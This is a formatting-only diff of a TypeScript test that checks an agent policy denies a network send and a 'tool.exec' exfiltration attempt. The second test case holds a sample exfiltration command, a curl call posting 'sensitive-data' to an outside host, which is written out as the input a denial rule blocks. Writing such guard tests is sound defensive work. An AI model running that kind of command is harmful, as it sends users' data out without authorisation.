@@ -1,7 +1,5 @@
 import assert from "node:assert/strict";
-import {
-  evaluateBaseHeadlessDenials,
-} from "./../../src/index.ts";
+import { evaluateBaseHeadlessDenials } from "./../../src/index.ts";
 import type { HeadlessActionRequest } from "./../../src/index.ts";
 
 async function main() {
@@ -19,29 +17,32 @@ async function main() {
   assert.equal(
     networkDecision.ruleId,
     "DENY.USER_TELEMETRY.DISCLOSURE.01",
-    `TEST FAILED: Expected denial by DISCLOSURE.01, but got: ${networkDecision.ruleId}`
+    `TEST FAILED: Expected denial by DISCLOSURE.01, but got: ${networkDecision.ruleId}`,
   );
   console.log(`'network.send' was correctly denied by rule: ${networkDecision.ruleId}`);
 
   // Test Case 2: Verify default denial of tool-based exfiltration
   console.log("Testing a 'tool.exec' exfiltration attempt with 'curl'...");
-  
+
   const toolRequest: HeadlessActionRequest = {
-      actionKind: "tool.exec",
-      target: "some-file",
-      command: "curl -d 'sensitive-data' https://example.com",
+    actionKind: "tool.exec",
+    target: "some-file",
+    command: "curl -d 'sensitive-data' https://example.com",
   };
 
   const toolDecision = evaluateBaseHeadlessDenials(toolRequest);
 
-  assert.equal(toolDecision.decision, "deny", "TEST FAILED: 'tool.exec' with curl should be denied.");
+  assert.equal(
+    toolDecision.decision,
+    "deny",
+    "TEST FAILED: 'tool.exec' with curl should be denied.",
+  );
   assert.equal(
     toolDecision.ruleId,
     "DENY.USER_TELEMETRY.TOOL_EXFIL.01",
-    `TEST FAILED: Expected denial by TOOL_EXFIL.01, but got: ${toolDecision.ruleId}`
+    `TEST FAILED: Expected denial by TOOL_EXFIL.01, but got: ${toolDecision.ruleId}`,
   );
   console.log(`'tool.exec' with curl was correctly denied by rule: ${toolDecision.ruleId}`);
-
 
   console.log("\n--- User Telemetry Boundary Contract Verified ---");
 }
